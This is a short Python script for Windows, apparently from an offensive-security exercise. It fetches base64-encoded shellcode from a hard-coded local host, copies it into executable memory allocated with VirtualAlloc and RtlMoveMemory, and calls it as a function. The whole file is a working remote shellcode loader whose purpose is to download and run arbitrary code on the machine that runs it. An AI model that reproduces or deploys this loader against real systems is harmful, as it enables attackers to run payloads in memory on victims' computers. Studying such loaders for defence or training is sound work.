from urllib import request

import base64
import ctypes


kernel32 = ctypes.windll.kernel32


def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())

    return shellcode


def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)

    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t,
    )
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr


def run(shellcode):
    # Allocate memory for the shellcode
    buf = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buf)
    # Cast the buffer to act like a function pointer, so that we can call it
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    # Execute our shellcode
    shell_func()


if __name__ == "__main__":
    url = "http://192.168.1.203:8000/32shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)
